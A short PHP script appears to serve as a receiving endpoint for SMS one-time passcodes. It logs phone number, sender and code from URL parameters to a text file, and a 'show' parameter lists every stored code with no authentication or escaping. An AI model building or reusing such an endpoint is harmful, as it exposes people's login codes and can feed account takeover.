<?php
date_default_timezone_set("Asia/Dhaka");

$file = __DIR__ . "/otps.txt";

if (isset($_GET['show'])) {
    echo "<pre>";
    if (file_exists($file)) {
        readfile($file);
    } else {
        echo "No OTPs yet.";
    }
    echo "</pre>";
    exit;
}

$mobile = $_GET['mobile'] ?? '';
$sender = $_GET['sender'] ?? '';
$otp    = $_GET['otp'] ?? '';
$time   = date("Y-m-d H:i:s");

if ($otp !== '') {
    $line = "$time | $mobile | $sender | OTP: $otp\n";
    file_put_contents($file, $line, FILE_APPEND | LOCK_EX);
}

echo "OK";
